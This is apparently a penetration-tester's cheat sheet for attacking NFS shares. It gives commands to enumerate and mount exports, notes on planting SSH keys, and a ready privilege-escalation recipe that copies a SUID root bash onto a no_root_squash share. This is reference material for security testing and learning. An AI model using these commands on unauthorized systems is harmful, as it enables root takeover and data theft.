# NFS (2049)

[[09 - Service Cheatsheets/00 - README|Folder index]]

## Attacker Mindset

Network File System. Enumerate exports **immediately** (`showmount -e`). `no_root_squash` means you can mount the export and write files as root on the server — drop a SUID binary or plant an SSH key in /root/.ssh/. World-readable shares expose sensitive files directly without authentication. Common alongside port 111 (portmapper) on Linux servers. **Common attack vectors:** no_root_squash exploitation (mount and write as root), world-readable share data harvesting, SSH key planting, SUID binary drop.

## Enumerate exports

```bash
showmount -e $IP
nmap --script nfs-ls,nfs-showmount,nfs-statfs -p 2049 $IP
```

## Mount

```bash
sudo mkdir /mnt/nfs
sudo mount -t nfs $IP:/share /mnt/nfs
ls -la /mnt/nfs/
sudo umount /mnt/nfs
```

## Privesc via no_root_squash

```bash
# If no_root_squash is set:
sudo cp /bin/bash /mnt/nfs/rootbash
sudo chmod +s /mnt/nfs/rootbash
# On target: /share/rootbash -p
```
